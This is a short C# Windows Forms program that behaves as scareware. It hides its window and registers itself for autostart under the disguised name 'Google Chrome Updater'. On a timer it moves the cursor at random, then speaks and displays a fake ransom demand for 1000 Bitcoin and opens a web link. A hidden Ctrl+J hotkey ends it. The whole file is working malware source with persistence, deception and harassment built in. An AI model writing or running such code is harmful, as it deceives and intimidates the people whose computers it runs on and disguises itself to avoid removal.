using System;
using System.Drawing;
using System.Windows.Forms;
using System.Speech.Synthesis;
using System.Diagnostics;
using Microsoft.Win32;
using System.Threading;
using System.Windows.Input;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace TTS
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll")]
        public static extern bool RegisterHotKey(IntPtr hWnd,
        int id, int fsModifiers, int vlc);

        [DllImport("user32.dll")]
        public static extern bool UnregisterHotKey(IntPtr hWnd, int id);

        RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

        Random rnd = new Random();

        public Form1()
        {
            InitializeComponent();

            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;
        }
        SpeechSynthesizer synth = new SpeechSynthesizer();

        private void Form1_Load(object sender, EventArgs e)
        {
            Form1.RegisterHotKey(this.Handle,
            this.GetType().GetHashCode(), 2, (int)'J');
            rkApp.SetValue("Google Chrome Updater", Application.ExecutablePath.ToString());
            timer1.Start();
            this.Visible = false;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            int x = rnd.Next(1, 1000);
            int y = rnd.Next(1, 1000);

            this.Cursor = new Cursor(Cursor.Current.Handle);
            Cursor.Position = new Point(x, y);
            Cursor.Clip = new Rectangle(this.Location, this.Size);

            synth.SpeakAsync("Your computer has been infected with a deadly virus, please send 1000 Bitcoin to the following address: ...");
            MessageBox.Show("Your computer has been infected with a deadly virus, please send 1000 BTC to the following address: ...");
            Process.Start("http://downloadmorewam.com");
        }

        protected override void WndProc(ref Message m)
        {
            if (m.Msg == 0x0312)
                this.Close();
            base.WndProc(ref m);
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Form1.UnregisterHotKey(this.Handle, this.GetType().GetHashCode());
        }
    }
}
